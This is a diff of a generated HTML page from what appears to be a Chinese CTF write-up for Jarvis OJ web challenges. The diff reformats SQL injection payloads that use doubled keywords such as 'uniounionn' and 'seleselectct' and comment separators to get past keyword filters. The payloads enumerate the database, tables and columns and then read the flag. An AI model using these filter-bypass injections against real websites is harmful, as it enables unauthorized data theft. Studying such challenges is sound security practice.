@@ -128,7 +128,7 @@
                   
                   &nbsp;<i class="far fa-chart-bar"></i>
                   <span class="post-count">
-                    657 字
+                    659 字
                   </span>&nbsp;
                 
 
@@ -220,15 +220,16 @@
 <p>说明字段为3</p>
 <img src="/2019/11/13/Jarvis%20OJ(web)WP/Image14.png" srcset="/img/loading.gif" title="image">
 
-<p>双写绕过对select和union的过滤<br>数据库名</p>
-<pre><code>?id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,database()</code></pre><p>查到数据库名是test</p>
+<p>双写绕过对select和union的过滤<br>数据库名<br>$$<br>?id=-1/<em>22</em>/uniounionn/<em>22</em>/seleselectct/<em>22</em>/1,2,database()<br>$$<br>查到数据库名是test</p>
 <p>表名</p>
-<pre><code>id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(table_name)/*22*/frfromom/*22*/information_schema.tables/*22*/where/*22*/table_schema=database()</code></pre><img src="/2019/11/13/Jarvis%20OJ(web)WP/Image16.png" srcset="/img/loading.gif" title="image">
+<p>$$<br>id=-1/<em>22</em>/uniounionn/<em>22</em>/seleselectct/<em>22</em>/1,2,group_concat(table_name)/<em>22</em>/frfromom/<em>22</em>/information_schema.tables/<em>22</em>/where/<em>22</em>/table_schema=database()<br>$$</p>
+<img src="/2019/11/13/Jarvis%20OJ(web)WP/Image16.png" srcset="/img/loading.gif" title="image">
 
 <p>列名</p>
-<pre><code>id=-1/*22*/uniounionn/*22*/seleselectct/*22*/1,2,group_concat(column_name)/*22*/frfromom/*22*/information_schema.columns/*22*/where/*22*/table_schema=database()/*22*/and/*22*/table_name=0x636f6e74656e74</code></pre><p>查出来是id,context,title</p>
+<p>$$<br>id=-1/<em>22</em>/uniounionn/<em>22</em>/seleselectct/<em>22</em>/1,2,group_concat(column_name)/<em>22</em>/frfromom/<em>22</em>/information_schema.columns/<em>22</em>/where/<em>22</em>/table_schema=database()/<em>22</em>/and/<em>22</em>/table_name=0x636f6e74656e74<br>$$<br>查出来是id,context,title</p>
 <p>读文件</p>
-<pre><code>id=-1/*22*/uniunionon/*22*/seleselectct/*22*/1,2,context/*22*/frofromm/*22*/content</code></pre><p>得到flag</p>
+<p>$$<br>id=-1/<em>22</em>/uniunionon/<em>22</em>/seleselectct/<em>22</em>/1,2,context/<em>22</em>/frofromm/<em>22</em>/content<br>$$</p>
+<p>得到flag</p>
 <img src="/2019/11/13/Jarvis%20OJ(web)WP/Image18.png" srcset="/img/loading.gif" title="image">
 
 
